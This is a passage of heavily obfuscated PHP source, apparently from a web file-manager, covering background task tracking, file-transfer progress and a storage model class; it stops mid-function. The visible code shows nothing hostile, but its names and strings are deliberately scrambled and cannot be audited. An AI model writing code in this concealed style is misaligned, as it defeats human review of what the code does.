update($Ï™Ö£ı = 0, $šğ˜û’û = false) { $÷ÚĞûÀÊ =& $_SERVER[«òÑğ]; $¼ãÂô®½ =& $this->task; if (!$¼ãÂô®½) { return; } $¼ãÂô®½[$÷ÚĞûÀÊ[1785]] += $Ï™Ö£ı; $¼ãÂô®½[$÷ÚĞûÀÊ[1789]] = timeFloat(); if ($¼ãÂô®½[$÷ÚĞûÀÊ[1150]]) { if ($¼ãÂô®½[$÷ÚĞûÀÊ[1150]] < $¼ãÂô®½[$÷ÚĞûÀÊ[1785]]) { $¼ãÂô®½[$÷ÚĞûÀÊ[1150]] = $¼ãÂô®½[$÷ÚĞûÀÊ[1785]]; } $°œŸ´¶İ = timeFloat() - $¼ãÂô®½[$÷ÚĞûÀÊ[1788]] - $¼ãÂô®½[$÷ÚĞûÀÊ[1791]]; if ($°œŸ´¶İ <= 0) { $°œŸ´¶İ = 0.001; } $¼ãÂô®½[$÷ÚĞûÀÊ[1786]] = $¼ãÂô®½[$÷ÚĞûÀÊ[1785]] / $¼ãÂô®½[$÷ÚĞûÀÊ[1150]]; $¼ãÂô®½[$÷ÚĞûÀÊ[1787]] = $¼ãÂô®½[$÷ÚĞûÀÊ[1785]] / $°œŸ´¶İ; if ($¼ãÂô®½[$÷ÚĞûÀÊ[1786]] > 0) { $¼ãÂô®½[$÷ÚĞûÀÊ[1792]] = $°œŸ´¶İ * (1 - $¼ãÂô®½[$÷ÚĞûÀÊ[1786]]) / $¼ãÂô®½[$÷ÚĞûÀÊ[1786]]; } $¼ãÂô®½[$÷ÚĞûÀÊ[1792]] = $¼ãÂô®½[$÷ÚĞûÀÊ[1792]] <= 0 ? 0 : $¼ãÂô®½[$÷ÚĞûÀÊ[1792]]; } $this->updateAfter(); $’ş×‹Ñ¹ = 0.2; if (timeFloat() - $¼ãÂô®½[$÷ÚĞûÀÊ[1790]] < $’ş×‹Ñ¹ && !$šğ˜û’û) { return; } $–ù‹ £€ = self::get($¼ãÂô®½[$÷ÚĞûÀÊ[478]]); $ÔØ…æó = $–ù‹ £€[$÷ÚĞûÀÊ[834]]; if ($ÔØ…æó == self::STATYS_KILL) { $Î¥ä»Ñ = array($÷ÚĞûÀÊ[1802] => LNG($÷ÚĞûÀÊ[1803]), $÷ÚĞûÀÊ[1307] => !1); Cache::set($÷ÚĞûÀÊ[1804] . $this->task[$÷ÚĞûÀÊ[478]], $Î¥ä»Ñ, 30); $this->onKill(); $this->end(); die; } else { if ($ÔØ…æó == self::STATYS_STOP) { $Ÿ¾ÃÈê = 2; $–ù‹ £€[$÷ÚĞûÀÊ[1791]] += $Ÿ¾ÃÈê; self::valueSet($¼ãÂô®½[$÷ÚĞûÀÊ[478]], $–ù‹ £€); sleep($Ÿ¾ÃÈê); $this->update(); return; } } $¼ãÂô®½[$÷ÚĞûÀÊ[834]] = $ÔØ…æó ? $ÔØ…æó : $¼ãÂô®½[$÷ÚĞûÀÊ[834]]; $¼ãÂô®½[$÷ÚĞûÀÊ[1791]] = $–ù‹ £€[$÷ÚĞûÀÊ[1791]] ? $–ù‹ £€[$÷ÚĞûÀÊ[1791]] : 0; $¼ãÂô®½[$÷ÚĞûÀÊ[1790]] = timeFloat(); Hook::trigger($÷ÚĞûÀÊ[1805], $¼ãÂô®½); self::valueSet($¼ãÂô®½[$÷ÚĞûÀÊ[478]], $¼ãÂô®½); } public function onKillSet($ñÎÜÆŠ¶, $ÔşÜ¹™ä = array()) { $this->onKillCall = array($ñÎÜÆŠ¶, $ÔşÜ¹™ä); } public function onKill() { $ìŒŸä‰­ =& $_SERVER[«òÑğ]; self::log($ìŒŸä‰­[1798] . $this->task[$ìŒŸä‰­[478]] . $ìŒŸä‰­[1806]); Hook::trigger($ìŒŸä‰­[1807], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ºª§Æ•½) { $Û¶î‘ëô =& $_SERVER[«òÑğ]; Cache::set($Û¶î‘ëô[1804] . $this->task[$Û¶î‘ëô[478]], $ºª§Æ•½, 60); if (!is_array($ºª§Æ•½) || !$ºª§Æ•½[$Û¶î‘ëô[1307]]) { self::log($Û¶î‘ëô[1808] . json_encode($ºª§Æ•½)); } return $ºª§Æ•½; } public static function get($‹œĞĞ´ä) { $Ö×ñïåß =& $_SERVER[«òÑğ]; $¯·‚ä‡ = self::valueGet($‹œĞĞ´ä); if (is_array($¯·‚ä‡) && $¯·‚ä‡[$Ö×ñïåß[1809]]) { $Û·Í”¶° = ActionApply($¯·‚ä‡[$Ö×ñïåß[1809]], array($¯·‚ä‡)); $¯·‚ä‡ = is_array($Û·Í”¶°) ? $Û·Í”¶° : $¯·‚ä‡; } return $¯·‚ä‡; } public static function listData() { $À­¬ğºØ = self::valueGet(); return array_sort_by($À­¬ğºØ, $_SERVER[«òÑğ][1788], !0); } public static function kill($¸€˜È€š) { return self::changeStatus($¸€˜È€š, self::STATYS_KILL); } public static function stop($Î½À°·) { return self::changeStatus($Î½À°·, self::STATYS_STOP); } public static function restart($»Ñ£·¶) { return self::changeStatus($»Ñ£·¶, self::STATYS_RUNNING); } public static function killAll() { $‹š²Ó¢ñ =& $_SERVER[«òÑğ]; $ÔÁâ–É = self::listData(); foreach ($ÔÁâ–É as $ÌÊšù¾…) { self::kill($ÌÊšù¾…[$‹š²Ó¢ñ[478]]); } sleep(2); foreach ($ÔÁâ–É as $ÌÊšù¾…) { self::valueSet($ÌÊšù¾…[$‹š²Ó¢ñ[478]], !1); } } private static function changeStatus($¤¦Æğ¼È, $™¯Ş¹Œ) { $Ü³·ü‘è =& $_SERVER[«òÑğ]; $¶æ¿ì° = self::valueGet($¤¦Æğ¼È); if (!$¶æ¿ì°) { return !1; } $¶æ¿ì°[$Ü³·ü‘è[834]] = $™¯Ş¹Œ; self::valueSet($¤¦Æğ¼È, $¶æ¿ì°); self::log($Ü³·ü‘è[1810] . $¶æ¿ì°[$Ü³·ü‘è[478]] . $Ü³·ü‘è[1811] . $™¯Ş¹Œ); return !0; } public static function valueGet($ĞÊÛ¿îé = false) { $ÅÑ•­å =& $_SERVER[«òÑğ]; if ($ĞÊÛ¿îé) { $–£–øÌ¦ = Model($ÅÑ•­å[523])->where(array($ÅÑ•­å[97] => $ĞÊÛ¿îé, $ÅÑ•­å[33] => $ÅÑ•­å[1159]))->find(); return $–£–øÌ¦ ? json_decode($–£–øÌ¦[$ÅÑ•­å[453]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ŒîÏŠİÇ = false) { $¢¬˜÷¡ =& $_SERVER[«òÑğ]; $Öû—¾¾• = array($¢¬˜÷¡[33] => $¢¬˜÷¡[1159]); if ($ŒîÏŠİÇ) { $Öû—¾¾•[$¢¬˜÷¡[1784]] = $ŒîÏŠİÇ; } $¬±íÄğï = Model($¢¬˜÷¡[523])->where($Öû—¾¾•)->select(); $¬±íÄğï = $¬±íÄğï ? $¬±íÄğï : array(); foreach ($¬±íÄğï as $Ïí¹¦äÃ => $àÑ¶ïŒ) { $¬±íÄğï[$Ïí¹¦äÃ] = json_decode($àÑ¶ïŒ[$¢¬˜÷¡[453]], !0); } return $¬±íÄğï; } public static function valueSet($¤¨ÔŒ©Š, $õÍµŸ±‰) { $ÉÍÄÜ½ù =& $_SERVER[«òÑğ]; if (!$õÍµŸ±‰) { return Model($ÉÍÄÜ½ù[523])->where(array($ÉÍÄÜ½ù[97] => $¤¨ÔŒ©Š, $ÉÍÄÜ½ù[33] => $ÉÍÄÜ½ù[1159]))->delete(); } $¼ä–îœö = json_encode($õÍµŸ±‰); if (!$¼ä–îœö) { ob_start(); var_dump($õÍµŸ±‰); $„Îë°£§ = ob_get_clean(); self::log($ÉÍÄÜ½ù[1812] . json_encode_force($„Îë°£§)); } if (!$¤¨ÔŒ©Š || !$õÍµŸ±‰[$ÉÍÄÜ½ù[478]]) { return !1; } $Ğ÷¨µµ” = array($ÉÍÄÜ½ù[33] => $ÉÍÄÜ½ù[1159], $ÉÍÄÜ½ù[1784] => USER_ID, $ÉÍÄÜ½ù[97] => $¤¨ÔŒ©Š, $ÉÍÄÜ½ù[453] => $¼ä–îœö); $ñå€ì = $ÉÍÄÜ½ù[1813]; CacheLock::lock($ñå€ì); Model($ÉÍÄÜ½ù[523])->add($Ğ÷¨µµ”, array(), !0); CacheLock::unlock($ñå€ì); } public static function log($†¯—İÊ°) { if (!GLOBAL_DEBUG) { return; } write_log($†¯—İÊ°, $_SERVER[«òÑğ][1814]); } } class TaskFileTransfer extends Task { protected function startAfter() { $€ø‚Ñ =& $_SERVER[«òÑğ]; $ÒĞı…ÀÖ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($€ø‚Ñ[1815], array($this, $€ø‚Ñ[1816])); Hook::bind($€ø‚Ñ[1318], array($this, $€ø‚Ñ[1817])); Hook::bind($€ø‚Ñ[1818], array($this, $€ø‚Ñ[1819])); Hook::bind($€ø‚Ñ[676], array($this, $€ø‚Ñ[1820])); Hook::bind($€ø‚Ñ[677], array($this, $€ø‚Ñ[1821])); Hook::bind($€ø‚Ñ[683], array($this, $€ø‚Ñ[1822])); Hook::bind($€ø‚Ñ[684], array($this, $€ø‚Ñ[1823])); Hook::bind($€ø‚Ñ[679], array($this, $€ø‚Ñ[1824])); Hook::bind($€ø‚Ñ[681], array($this, $€ø‚Ñ[1825])); Hook::bind($€ø‚Ñ[645], array($this, $€ø‚Ñ[1826])); Hook::bind($€ø‚Ñ[642], array($this, $€ø‚Ñ[1826])); Hook::bind($€ø‚Ñ[647], array($this, $€ø‚Ñ[1826])); Hook::bind($€ø‚Ñ[649], array($this, $€ø‚Ñ[1826])); Hook::bind($€ø‚Ñ[651], array($this, $€ø‚Ñ[1826])); Hook::bind($€ø‚Ñ[1827], array($this, $€ø‚Ñ[1828])); Hook::bind($€ø‚Ñ[667], array($this, $€ø‚Ñ[1829])); $this->sourceModelCopyFlag = !1; Hook::bind($€ø‚Ñ[1830], array($this, $€ø‚Ñ[1831])); Hook::bind($€ø‚Ñ[1832], array($this, $€ø‚Ñ[1833])); Hook::bind($€ø‚Ñ[1834], array($this, $€ø‚Ñ[1835])); $ÒĞı…ÀÖ[$€ø‚Ñ[1836]] = LNG($€ø‚Ñ[1837]); $ÒĞı…ÀÖ[$€ø‚Ñ[1838]] = 0; $ÒĞı…ÀÖ[$€ø‚Ñ[1839]] = 0; $ÒĞı…ÀÖ[$€ø‚Ñ[1152]] = $€ø‚Ñ[12]; $ÒĞı…ÀÖ[$€ø‚Ñ[1840]] = $€ø‚Ñ[12]; $ÒĞı…ÀÖ[$€ø‚Ñ[1841]] = 0; $ÒĞı…ÀÖ[$€ø‚Ñ[1842]] = 0; $ÒĞı…ÀÖ[$€ø‚Ñ[1843]] = 0; if (!$ÒĞı…ÀÖ[$€ø‚Ñ[1671]]) { $ÒĞı…ÀÖ[$€ø‚Ñ[1671]] = LNG($€ø‚Ñ[1844]); } } protected function endAfter() { $ßÕó•—Ç =& $_SERVER[«òÑğ]; Hook::unbind($ßÕó•—Ç[1815], array($this, $ßÕó•—Ç[1816])); Hook::unbind($ßÕó•—Ç[1318], array($this, $ßÕó•—Ç[1817])); Hook::unbind($ßÕó•—Ç[1818], array($this, $ßÕó•—Ç[1819])); Hook::unbind($ßÕó•—Ç[676], array($this, $ßÕó•—Ç[1820])); Hook::unbind($ßÕó•—Ç[677], array($this, $ßÕó•—Ç[1821])); Hook::unbind($ßÕó•—Ç[683], array($this, $ßÕó•—Ç[1822])); Hook::unbind($ßÕó•—Ç[684], array($this, $ßÕó•—Ç[1823])); Hook::unbind($ßÕó•—Ç[679], array($this, $ßÕó•—Ç[1824])); Hook::unbind($ßÕó•—Ç[681], array($this, $ßÕó•—Ç[1825])); Hook::unbind($ßÕó•—Ç[645], array($this, $ßÕó•—Ç[1826])); Hook::unbind($ßÕó•—Ç[642], array($this, $ßÕó•—Ç[1826])); Hook::unbind($ßÕó•—Ç[647], array($this, $ßÕó•—Ç[1826])); Hook::unbind($ßÕó•—Ç[649], array($this, $ßÕó•—Ç[1826])); Hook::unbind($ßÕó•—Ç[651], array($this, $ßÕó•—Ç[1826])); Hook::unbind($ßÕó•—Ç[1827], array($this, $ßÕó•—Ç[1828])); Hook::unbind($ßÕó•—Ç[667], array($this, $ßÕó•—Ç[1829])); Hook::unbind($ßÕó•—Ç[1830], array($this, $ßÕó•—Ç[1831])); Hook::unbind($ßÕó•—Ç[1832], array($this, $ßÕó•—Ç[1833])); Hook::unbind($ßÕó•—Ç[1834], array($this, $ßÕó•—Ç[1835])); } public function copyMoveStart($ÈåÒ˜Çì, $¥»û§, $ÜÓØäõ, $°¬Ù¥æª) { $Ü»°´¹¢ =& $_SERVER[«òÑğ]; self::log($Ü»°´¹¢[1845] . $¥»û§ . $Ü»°´¹¢[73] . $°¬Ù¥æª); $Ÿú¹ì© = rtrim(TEMP_FILES, $Ü»°´¹¢[8]); if (substr($¥»û§, 0, strlen($Ÿú¹ì©)) == $Ÿú¹ì©) { return; } if (substr($°¬Ù¥æª, 0, strlen($Ÿú¹ì©)) == $Ÿú¹ì©) { return; } $áÂõÇŠÉ =& $this->task; $áÂõÇŠÉ[$Ü»°´¹¢[1846]] = KodIO::transferType($ÈåÒ˜Çì, $ÜÓØäõ); $this->update(); } public function updateAfter() { $¬˜õÕ¦ş =& $_SERVER[«òÑğ]; $İÒüÖ÷ =& $this->task; if (!$İÒüÖ÷[$¬˜õÕ¦ş[847]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($İÒüÖ÷[$¬˜õÕ¦ş[1846]] == $¬˜õÕ¦ş[1412]) { return; } self::updateTask($İÒüÖ÷); } private static function updateTask(&$øÎÈÖÑ¬) { $ˆİƒ»¡× =& $_SERVER[«òÑğ]; if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1846]] == $ˆİƒ»¡×[1289] || $øÎÈÖÑ¬[$ˆİƒ»¡×[1846]] == $ˆİƒ»¡×[110]) { if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1840]]) { $øÎÈÖÑ¬[$ˆİƒ»¡×[1843]] = $øÎÈÖÑ¬[$ˆİƒ»¡×[1842]] + $øÎÈÖÑ¬[$ˆİƒ»¡×[1839]]; } } else { if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1846]] == $ˆİƒ»¡×[1413]) { if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1840]] == $ˆİƒ»¡×[1289]) { $øÎÈÖÑ¬[$ˆİƒ»¡×[1843]] = $øÎÈÖÑ¬[$ˆİƒ»¡×[1842]] + $øÎÈÖÑ¬[$ˆİƒ»¡×[1839]] * 0.5; } else { if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1840]] == $ˆİƒ»¡×[110]) { $øÎÈÖÑ¬[$ˆİƒ»¡×[1843]] = $øÎÈÖÑ¬[$ˆİƒ»¡×[1842]] + $øÎÈÖÑ¬[$ˆİƒ»¡×[1838]] * 0.5 + $øÎÈÖÑ¬[$ˆİƒ»¡×[1839]] * 0.5; } } } } $øÎÈÖÑ¬[$ˆİƒ»¡×[1786]] = $øÎÈÖÑ¬[$ˆİƒ»¡×[1843]] / $øÎÈÖÑ¬[$ˆİƒ»¡×[847]]; if ($øÎÈÖÑ¬[$ˆİƒ»¡×[1786]] > 0) { $ˆä±‹Óá = timeFloat() - $øÎÈÖÑ¬[$ˆİƒ»¡×[1788]] - $øÎÈÖÑ¬[$ˆİƒ»¡×[1791]]; $øÎÈÖÑ¬[$ˆİƒ»¡×[1792]] = $ˆä±‹Óá * (1 - $øÎÈÖÑ¬[$ˆİƒ»¡×[1786]]) / $øÎÈÖÑ¬[$ˆİƒ»¡×[1786]]; } } public function addPath($ˆéƒÙì¤) { $éŸ¥™Ù® =& $_SERVER[«òÑğ]; if (!$ˆéƒÙì¤) { return; } $Â»Õ‘¦¹ =& $this->task; $î°ÓºšÄ = IO::infoWithChildren($ˆéƒÙì¤); $Ô¯¶ıè— = $Â»Õ‘¦¹[$éŸ¥™Ù®[1847]] ? $Â»Õ‘¦¹[$éŸ¥™Ù®[1847]][$éŸ¥™Ù®[1848]] : 0; $Â»Õ‘¦¹[$éŸ¥™Ù®[1847]] = array($éŸ¥™Ù®[1848] => $Ô¯¶ıè— + 1, $éŸ¥™Ù®[497] => $î°ÓºšÄ[$éŸ¥™Ù®[32]], $éŸ¥™Ù®[87] => $î°ÓºšÄ[$éŸ¥™Ù®[87]], $éŸ¥™Ù®[587] => $î°ÓºšÄ[$éŸ¥™Ù®[587]] ? $î°ÓºšÄ[$éŸ¥™Ù®[587]] : $î°ÓºšÄ[$éŸ¥™Ù®[87]]); if ($î°ÓºšÄ[$éŸ¥™Ù®[33]] == $éŸ¥™Ù®[233]) { $Â»Õ‘¦¹[$éŸ¥™Ù®[1150]] += 1; } else { $Â»Õ‘¦¹[$éŸ¥™Ù®[1150]] += $î°ÓºšÄ[$éŸ¥™Ù®[82]][$éŸ¥™Ù®[80]]; if ($î°ÓºšÄ[$éŸ¥™Ù®[194]]) { $Â»Õ‘¦¹[$éŸ¥™Ù®[1150]] += $î°ÓºšÄ[$éŸ¥™Ù®[82]][$éŸ¥™Ù®[81]] + 1; } } $Â»Õ‘¦¹[$éŸ¥™Ù®[847]] += $î°ÓºšÄ[$éŸ¥™Ù®[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($‡ÚÚò‹Ë) { } public function sourceAddHashEnd($Ü¯àš‘“) { } public function sourceAddFileStart($ÛëÖïµ¦) { $²Òƒƒû÷ =& $_SERVER[«òÑğ]; $¬†Êßù =& $this->task; $¬†Êßù[$²Òƒƒû÷[1838]] = $ÛëÖïµ¦[$²Òƒƒû÷[79]]; $¬†Êßù[$²Òƒƒû÷[1836]] = $ÛëÖïµ¦[$²Òƒƒû÷[32]]; $¬†Êßù[$²Òƒƒû÷[1152]] = $ÛëÖïµ¦[$²Òƒƒû÷[32]]; $¬†Êßù[$²Òƒƒû÷[1849]] = $ÛëÖïµ¦[$²Òƒƒû÷[87]]; $this->update(); } public function sourceAddFileEnd($ÙğçÊ¤ï) { $µ›Ñ”„ğ =& $_SERVER[«òÑğ]; $¯«•Í† =& $this->task; $¯«•Í†[$µ›Ñ”„ğ[1843]] += $ÙğçÊ¤ï[$µ›Ñ”„ğ[79]]; $¯«•Í†[$µ›Ñ”„ğ[1849]] = $ÙğçÊ¤ï[$µ›Ñ”„ğ[87]]; $this->update(1); } public function copyFileStart($Ô²†ÛùŸ, $­İºÍèÚ, $£­¹ï›™, $òª–ø÷ñ, $£¿¡Ÿ¶, $›Õ¬ñÁ²) { $Œ×«ÜÆµ =& $_SERVER[«òÑğ]; $µ¾‘‰¼ = $£¿¡Ÿ¶; if ($µ¾‘‰¼ == $GLOBALS[$Œ×«ÜÆµ[1850]]) { $µ¾‘‰¼ = $GLOBALS[$Œ×«ÜÆµ[1851]]; } $GLOBALS[$Œ×«ÜÆµ[1851]] = $£¿¡Ÿ¶; $GLOBALS[$Œ×«ÜÆµ[1850]] = $›Õ¬ñÁ²; $§¾Éƒ» =& $this->task; $§¾Éƒ»[$Œ×«ÜÆµ[1836]] = $µ¾‘‰¼; $§¾Éƒ»[$Œ×«ÜÆµ[1838]] = (int) $Ô²†ÛùŸ->size($­İºÍèÚ); $§¾Éƒ»[$Œ×«ÜÆµ[1839]] = 0; $§¾Éƒ»[$Œ×«ÜÆµ[1152]] = $Œ×«ÜÆµ[12]; $§¾Éƒ»[$Œ×«ÜÆµ[1840]] = $Œ×«ÜÆµ[12]; $§¾Éƒ»[$Œ×«ÜÆµ[1841]] = 0; $øìÛ—³ı = $§¾Éƒ»[$Œ×«ÜÆµ[1838]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($§¾Éƒ»[$Œ×«ÜÆµ[478]] . $Œ×«ÜÆµ[1852]); if ($øìÛ—³ı && file_exists(get_path_father($òª–ø÷ñ))) { Cache::set($§¾Éƒ»[$Œ×«ÜÆµ[478]] . $Œ×«ÜÆµ[1852], $òª–ø÷ñ); $§¾Éƒ»[$Œ×«ÜÆµ[1809]] = array($Œ×«ÜÆµ[1853], $Œ×«ÜÆµ[1854]); } $this->update(0, $øìÛ—³ı); } public static function updateCopyLocalFileSize($üõ–‚¡¹) { $ÚıÀ¨†ª =& $_SERVER[«òÑğ]; $‘ˆĞĞïÙ = Cache::get($üõ–‚¡¹[$ÚıÀ¨†ª[478]] . $ÚıÀ¨†ª[1852]); if (!$‘ˆĞĞïÙ || !file_exists($‘ˆĞĞïÙ)) { return $üõ–‚¡¹; } $üõ–‚¡¹[$ÚıÀ¨†ª[1839]] = @filesize($‘ˆĞĞïÙ); $üõ–‚¡¹[$ÚıÀ¨†ª[1843]] += $üõ–‚¡¹[$ÚıÀ¨†ª[1839]]; self::updateTask($üõ–‚¡¹); return $üõ–‚¡¹; } public function copyFileEnd($ñå¡‰Ú¤, $Ğ—Ô, $ŸÔ²åª, $½´ª½ò¿, $Á„¶½Ş, $ñÉ‡ÃÙï) { $øÀñ£®Î =& $_SERVER[«òÑğ]; $ ‘šÎŞï =& $this->task; $ ‘šÎŞï[$øÀñ£®Î[1839]] = $ ‘šÎŞï[$øÀñ£®Î[1838]]; $ ‘šÎŞï[$øÀñ£®Î[1840]] = $øÀñ£®Î[12]; unset($ ‘šÎŞï[$øÀñ£®Î[1809]]); if ($Á„¶½Ş == $ ‘šÎŞï[$øÀñ£®Î[1836]]) { $ ‘šÎŞï[$øÀñ£®Î[1842]] += $ ‘šÎŞï[$øÀñ£®Î[1838]]; $ ‘šÎŞï[$øÀñ£®Î[1843]] = $ ‘šÎŞï[$øÀñ£®Î[1842]]; $·ùÌÖÇÚ = 1; if (isset($ ‘šÎŞï[$øÀñ£®Î[1849]]) && $ ‘šÎŞï[$øÀñ£®Î[1849]] == $Ğ—Ô) { $·ùÌÖÇÚ = 0; } $this->update($·ùÌÖÇÚ); } else { $this->update(); $ ‘šÎŞï[$øÀñ£®Î[1839]] = 0; } Cache::remove($ ‘šÎŞï[$øÀñ£®Î[478]] . $øÀñ£®Î[1852]); self::log($øÀñ£®Î[1855] . $Ğ—Ô . $øÀñ£®Î[73] . $½´ª½ò¿ . $øÀñ£®Î[288] . $Á„¶½Ş . $øÀñ£®Î[1856] . $ ‘šÎŞï[$øÀñ£®Î[1836]]); } public function updateFileEnd($Åáæ¢á, $›¯´ÀÃ) { $¸ŞÅÁ±À =& $_SERVER[«òÑğ]; $Ì´Ğ‚ =& $this->task; $Ì´Ğ‚[$¸ŞÅÁ±À[1836]] = $Åáæ¢á; $Ì´Ğ‚[$¸ŞÅÁ±À[1838]] = $›¯´ÀÃ; $Ì´Ğ‚[$¸ŞÅÁ±À[1842]] += $›¯´ÀÃ; $Ì´Ğ‚[$¸ŞÅÁ±À[1843]] = $Ì´Ğ‚[$¸ŞÅÁ±À[1842]]; $this->update(1); self::log($¸ŞÅÁ±À[1857] . $Åáæ¢á); } public function sourceModelCopy($—è›ÇÂ) { $İÙêú =& $_SERVER[«òÑğ]; $¸Î®Ü—é = $—è›ÇÂ[0]; $Â Àê¿¾ = $—è›ÇÂ[1]; $©Î†İ…Ö =& $this->task; $this->sourceModelCopyFlag = !0; $äòæÍĞ˜ = 0; switch ($¸Î®Ü—é) { case $İÙêú[643]: $äòæÍĞ˜ = 1; break; case $İÙêú[646]: $©Î†İ…Ö[$İÙêú[1836]] = $Â Àê¿¾[$İÙêú[32]]; break; case $İÙêú[648]: $äòæÍĞ˜ = intval($—è›ÇÂ[$İÙêú[459]] * 0.4); break; case $İÙêú[650]: $äòæÍĞ˜ = intval($—è›ÇÂ[$İÙêú[459]] * 0.2); break; case $İÙêú[652]: $äòæÍĞ˜ = intval($—è›ÇÂ[$İÙêú[459]] * 0.4); break; } $this->update($äòæÍĞ˜); $this->sourceModelCopyFlag = !1; } public function sourceRemove($à¼øØÀÁ, $ôëÀÀ¢é) { $Ş ‘İÑÉ =& $_SERVER[«òÑğ]; $this->sourceModelCopyFlag = !0; $ƒÈİè† = 1; if (isset($à¼øØÀÁ[$Ş ‘İÑÉ[82]])) { $ƒÈİè† = $à¼øØÀÁ[$Ş ‘İÑÉ[82]][$Ş ‘İÑÉ[80]]; $ƒÈİè† = $ƒÈİè† + $à¼øØÀÁ[$Ş ‘İÑÉ[82]][$Ş ‘İÑÉ[81]] + 1; } $this->update($ƒÈİè†); $this->sourceModelCopyFlag = !1; } public function sourceMove($²¤Ì¸¡Ö) { $this->sourceRemove($²¤Ì¸¡Ö, !1); } public function curlProgress($æƒı ¢, $Ö‰ˆ¸ƒ¤, $œñŸ¸‚™, $Õ€ÜİÃ, $êà§Öâå) { $—ë€÷Ë =& $_SERVER[«òÑğ]; $òÆßèÌë =& $this->task; if ($êà§Öâå > 0) { $òÆßèÌë[$—ë€÷Ë[1152]] = $—ë€÷Ë[1858]; $òÆßèÌë[$—ë€÷Ë[1840]] = $—ë€÷Ë[110]; if ($òÆßèÌë[$—ë€÷Ë[1838]]) { $òÆßèÌë[$—ë€÷Ë[1839]] = $êà§Öâå; } if ($òÆßèÌë[$—ë€÷Ë[1841]]) { $òÆßèÌë[$—ë€÷Ë[1839]] = $êà§Öâå + $òÆßèÌë[$—ë€÷Ë[1841]]; } } else { if ($œñŸ¸‚™ > 0) { if ($òÆßèÌë[$—ë€÷Ë[1838]] == $Ö‰ˆ¸ƒ¤) { $òÆßèÌë[$—ë€÷Ë[1839]] = $œñŸ¸‚™; $òÆßèÌë[$—ë€÷Ë[1152]] = $—ë€÷Ë[1859]; $òÆßèÌë[$—ë€÷Ë[1840]] = $—ë€÷Ë[1289]; } } } $this->update(); } public function curlProgressStart($´íÃ–ƒ) { } public function curlProgressEnd($î¢•âÑ­) { $•×ËÕå =& $_SERVER[«òÑğ]; $ªùŒÏ­ú =& $this->task; $’ùĞ°–½ = curl_getinfo($î¢•âÑ­); $ÑàúëĞ = $’ùĞ°–½[$•×ËÕå[1860]]; if ($ÑàúëĞ == -1) { $ÑàúëĞ = $’ùĞ°–½[$•×ËÕå[1861]]; } if ($ªùŒÏ­ú[$•×ËÕå[1840]] == $•×ËÕå[110] && $ÑàúëĞ) { $ªùŒÏ­ú[$•×ËÕå[1841]] += $ÑàúëĞ; } $this->update(); } } goto A¦ÖÏ¨ô‰”; A‚Ğ’çĞµà: class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\x2e\x73\x6f\x75\x72\143\145\x53\145\x63\x72\145\x74\114\151\163\164"; public $field = array("\x73\157\x75\x72\143\x65\x49\x44", "\x74\171\x70\x65\111\104", "\143\162\145\141\164\145\x55\163\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\x73\x74\x6f\x72\141\x67\145\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\163\151\x7a\145\x4d\x61\x78", "\163\171\x73\x74\145\x6d", "\144\145\146\141\165\x6c\164", "\x64\162\151\166\x65\162", "\143\157\156\x66\x69\x67"); public function listData($‡æåêÙ = false, $ßŒœ‡ŞÑ = "\155\157\x64\151\x66\x79\124\x69\155\145", $ÒœñæÔ¥ = false) { $ Ğğğ¦ =& $_SERVER[«òÑğ]; $ËïÄòß± = parent::listData($‡æåêÙ, $ßŒœ‡ŞÑ, $ÒœñæÔ¥); if ($‡æåêÙ) { return $ËïÄòß±; } $äü¨Ó£û = array(); if ($GLOBALS[$ Ğğğ¦[2324]]) { $äü¨Ó£û = $this->ioSizeUseGet(array_to_keyvalue($ËïÄòß±, $ Ğğğ¦[12], $ Ğğğ¦[478])); } foreach ($ËïÄòß± as $“æ×ÆÑ => $ç¯´üÂ) { unset($ËïÄòß±[$“æ×ÆÑ][$ Ğğğ¦[6]]); $ËïÄòß±[$“æ×ÆÑ][$ Ğğğ¦[1973]] = isset($äü¨Ó£û[$ç¯´üÂ[$ Ğğğ¦[478]]]) ? $äü¨Ó£û[$ç¯´üÂ[$ Ğğğ¦[478]]] : 0; } return $ËïÄòß±; } public function ioSizeUseGet($×Ã¯Ü½Õ) { $ÆÃ…›«ã =& $_SERVER[«òÑğ]; if (!$×Ã¯Ü½Õ) { return array(); } $×¸¤Õó“ = $ÆÃ…›«ã[2325] . implode($ÆÃ…›«ã[50], $×Ã¯Ü½Õ); $ºúŸ€İ§ = Cache::get($×¸¤Õó“); if ($ºúŸ€İ§) { return $ºúŸ€İ§; } $òØŞ»Ó„ = array($ÆÃ…›«ã[907] => $ÆÃ…›«ã[478], $ÆÃ…›«ã[2326] => $ÆÃ…›«ã[79]); $¢®é’«Í = array($ÆÃ…›«ã[907] => array($ÆÃ…›«ã[7], $×Ã¯Ü½Õ)); $ºúŸ€İ§ = Model($ÆÃ…›«ã[875])->field($òØŞ»Ó„)->where($¢®é’«Í)->group($ÆÃ…›«ã[907])->select(); $ºúŸ€İ§ = array_to_keyvalue($ºúŸ€İ§, $ÆÃ…›«ã[478], $ÆÃ…›«ã[79]); Cache::set($×¸¤Õó“, $ºúŸ€İ§, 600); return $ºúŸ€İ§; } public function getConfig($²Äôª¶) { $’ê…®†™ = parent::listData($²Äôª¶); $èäŞÙ¡ = _get($’ê…®†™, $_SERVER[«òÑğ][6], array()); if ($èäŞÙ¡ && !is_array($èäŞÙ¡)) { $èäŞÙ¡ = json_decode($èäŞÙ¡, !0); } return $èäŞÙ¡; } public function update($ì—„Ã¢³, $Ê†ËºÙŸ) { $·’™·É‚ =& $_SERVER[«òÑğ]; $„î…“­³ = 